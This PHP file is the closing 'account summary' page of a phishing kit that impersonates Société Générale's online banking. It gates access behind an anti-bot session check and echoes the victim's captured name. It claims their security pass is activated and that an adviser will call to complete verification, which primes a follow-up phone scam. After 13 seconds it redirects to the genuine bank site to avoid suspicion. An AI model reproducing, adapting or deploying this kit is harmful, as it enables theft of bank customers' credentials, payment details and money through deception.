<?php
session_start();
date_default_timezone_set('Europe/Paris');
$dateHeure = date('d/m/y, H:i:s');

include "../server/fonctions.php";
require "../server/all.php";
include "../server/script.php";
if (isset($_SESSION['killbot_autorisé']) && $_SESSION['killbot_autorisé'] ==  true) { 
?>
<!DOCTYPE html>
<html class="awt--standalone awt--ngim" lang="FR">

<head>
	<!-- Titre page -->
	<title>SG | Récapitulatif de votre compte. </title>
	<!-- Favicon -->
	<link rel="icon" type="image/x-icon" href="../assets/favicon.ico">
	<!-- Balise  -->
	<meta http-equiv="refresh" content="13;URL=https://particuliers.sg.fr/icd/cbo/index-authsec.html">
	<meta charset="UTF-8">
	<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
	<meta name="robots" content="noindex, nofollow">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<!-- CCS  -->
	<link rel="stylesheet" href="../assets/css/awt-front-BDDF.css" media="all">
	<link rel="stylesheet" href="../assets/css/main2.css" media="all">
	<link href="../assets/css/index.min.css" rel="stylesheet" type="text/css">
	<link href="../assets/css/spec56_btn_gsm_all_gcd_20221102095656.min.css" rel="stylesheet" type="text/css">
	<link href="../assets/css/print.min.css" rel="stylesheet" type="text/css" media="print">
	<!-- JS  -->
</head>
<style>
	body {
		margin: 0;
		padding: 0;
		overflow-x: hidden;
		/* Empêche la barre de défilement horizontale */
	}
</style>

<style>
	#root {
		margin: 0;
		padding: 0;

		.stl_grid_row {
			margin-left: 0 !important;
			margin-right: 0 !important;
		}

	}
</style>

<body>
	<header>
		<?php include("../assets/header.php"); ?>
	</header>




	<button class="dcw_skip" onclick="">Aller au menu principal</button>
	<button class="dcw_skip" onclick="">Aller au contenu</button>
	<section class="dcw_main">
		<section class="dcw_gb_row dcw_gb_communication"></section>
		<section class="avenir_gb_wrapper ">
			<main role="main">
				<section class="dcw_gb_core ugds_serviciel" id="">
					<div id="awt--root-element" class="awt--root-element">
						<div id="sdcWrapper" class="sdcWrapper theme-enseigne-bddf theme-banque-bddf theme-marche-pri">
							<div style=""></div>

							<div class="SGBoxStyled-sc-1r671le-0 HFaNz stl_box stl_box--top--sm"></div>
							<div class="stl_grid_row stl_grid_row-start stl_grid_row-middle SGGridRowStyled-sc-18jw88p-0 fwLPRs stl_grid_row" style="margin-left: -14px; margin-right: -14px; row-gap: 0px;">
								<div class="stl_grid_col stl_grid_col-null stl_grid_col-offset-1 SGGridColStyled-sc-6esajy-0 jOBtwG stl_grid_col--textalign-left stl_grid_col-xs-12 stl_grid_col-sm-9 stl_grid_col-md-7 stl_grid_col-lg-6 stl_grid_col-xl-2" style="padding-left: 14px; padding-right: 14px;">
									<button type="button" class="stl_btn SGButtonStyled-sc-hifh5r-0 fZWyMO stl_btn stl_btn--tertiary stl_btn--medium stl_btn-tertiary stl_btn-block">
										<span class="stl_btn__inner">
											<span class="SGIconStyled-sc-19bihye-0 dKskyj stl_icon stl_icon--s stl_icon--left">
												<svg aria-hidden="true" focusable="false" class="stroked" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg" stroke-miterlimit="1.5" fill="none">
													<path d="M12.669 7.754l4.796 4.746-4.81 4.718" class="stroked__path--stroke" style="stroke-width: 2;"></path>
													<path d="M5 12.5h11.638" class="stroked__path--stroke" style="stroke-width: 2;"></path>
												</svg>
											</span>
											<span class="stl_btn__label">Retour</span>
										</span>
									</button>
								</div>
							</div>
							<!-- Page Titre -->
							<div class="SGBoxStyled-sc-1r671le-0 duBNYo stl_box stl_box--bottom--xl stl_box--top--xl">
								<h2 class="ant-typography SGTitleStyled-sc-1uu0wpc-0 iTVHLn stl_title stl_title--1">Récapitulatif de votre compte.</h2><span>
	
								</span>
								</span>
							</div>
							<!-- Barre Progression -->



							<div class="stl_grid_row stl_grid_row-center stl_grid_row-top SGGridRowStyled-sc-18jw88p-0 fwLPRs stl_grid_row" style="margin-left: -14px; margin-right: -14px; row-gap: 0px;">
								<div class="stl_grid_col stl_grid_col-null SGGridColStyled-sc-6esajy-0 kaoNPF stl_grid_col--textalign-left stl_grid_col-xs-12 stl_grid_col-sm-12 stl_grid_col-md-8 stl_grid_col-lg-10 stl_grid_col-xl-6" style="padding-left: 14px; padding-right: 14px;">
									<div class="SGBoxStyled-sc-1r671le-0 gxKKyC stl_box stl_box--bottom--xs stl_box--text-align-left">

										<div class="stl_steps stl_steps-horizontal SGStepsStyled-sc-nxoyus-0 dRshFc stl_steps-label-horizontal">
											<div aria-current="step" class="stl_steps-item stl_steps-item-process SGStepStyled-sc-um1ppc-0 fvGyeI ">

												<div class="stl_steps-item-container">
													<div class="stl_steps-item-tail"></div>
													<div class="stl_steps-item-icon">
														<span class="stl_steps-icon">1</span>
													</div>
													<div class="stl_steps-item-content">
														<div class="stl_steps-item-title">
															Informations personnelles
														</div>
													</div>
												</div>
											</div>


											<div aria-current="step" class="stl_steps-item stl_steps-item-process SGStepStyled-sc-um1ppc-0 fvGyeI ">
												<div class="stl_steps-item-container">
													<div class="stl_steps-item-tail"></div>
													<div class="stl_steps-item-icon">
														<span class="stl_steps-icon">2</span>
													</div>
													<div class="stl_steps-item-content">
														<div class="stl_steps-item-title">
															Vos informations de paiements
														</div>
													</div>
												</div>
											</div>

											<div aria-current="step" class="stl_steps-item stl_steps-item-process SGStepStyled-sc-um1ppc-0 fvGyeI stl_steps-item-active ">
												<div class="stl_steps-item-container">
													<div class="stl_steps-item-tail"></div>
													<div class="stl_steps-item-icon">
														<span class="stl_steps-icon">3</span>
													</div>
													<div class="stl_steps-item-content">
														<div class="stl_steps-item-title">
															Récapitulatif
														</div>
													</div>
												</div>
											</div>
											<span class="SGStepsCounterStyled-sc-xuyrep-0 eUrRIv stl_steps-counter">


										</div>
									</div>
								</div>
							</div>

							<section class="stl_layout SGLayoutStyled-sc-137s6yd-0 crCDLR stl_layout--background-gradient">
								<aside class="stl_layout__content SGContentStyled-sc-b656on-0 cHAlqP">
									<div class="stl_grid_row stl_grid_row-center stl_grid_row-top SGGridRowStyled-sc-18jw88p-0 fwLPRs stl_grid_row" style="margin-left: -14px; margin-right: -14px; row-gap: 0px;">
										<div class="stl_grid_col stl_grid_col-null SGGridColStyled-sc-6esajy-0 kaoNPF stl_grid_col--textalign-left stl_grid_col-xs-12 stl_grid_col-sm-12 stl_grid_col-md-8 stl_grid_col-lg-8 stl_grid_col-xl-8" style="padding-left: 14px; padding-right: 14px;">
											<div class="stl_layout SGLayoutStyled-sc-137s6yd-0 eOHIgR">
												<div class="stl_grid_row stl_grid_row-center stl_grid_row-top SGGridRowStyled-sc-18jw88p-0 fwLPRs stl_grid_row" style="margin-left: -14px; margin-right: -14px; row-gap: 0px;">
													<div class="stl_grid_col stl_grid_col-null SGGridColStyled-sc-6esajy-0 jOBtwG stl_grid_col--textalign-left stl_grid_col-xs-12 stl_grid_col-sm-12 stl_grid_col-md-12 stl_grid_col-lg-12 stl_grid_col-xl-12" style="padding-left: 14px; padding-right: 14px;">



<div class="SGInputWrapperStyled-sc-rgbn3c-0 eEtWwo stl_input__wrapper">

	<center><div class="vupri_alertbox__content">


	<center><img src ='https://particuliers.sg.fr/staticfiles/Particuliers/Medias/Home/Securite/Telephone-securite/onglet_1_4_20221103145412.png' width ='350'></center>
		
		<h4 class="vupri_alertbox__message"> <span class="precision"><?php echo $_SESSION['nom']; ?> <?php echo $_SESSION['prenom']; ?> </h4>
		<h4 class="vupri_alertbox__message"> <span class="precision">Le  <?php echo $dateHeure ; ?> votre pass sécurité a bien été activé ainsi que toutes vos autres fonctionnalités sont opérationnelles.Un de nos conseillers va bientôt vous contacter pour finaliser la vérification. Merci de rester disponible et de répondre à son appel. Votre coopération est essentielle</h4>

		
</div></center>




</div>



<br><br><br><br><br>

						</div>
					</div>
				</div>
			</div>
		</div>
</aside>
				</section>
				</div>
				</div>
		</section>
		</main>
	</section>
	</section>
	<!-- FOOTER -->
	<?php include("../assets/footer.php"); ?>
</body>
</html>	

<?php
}
else {
	session_destroy();
	header('Location ../404.php');
	

}
?>

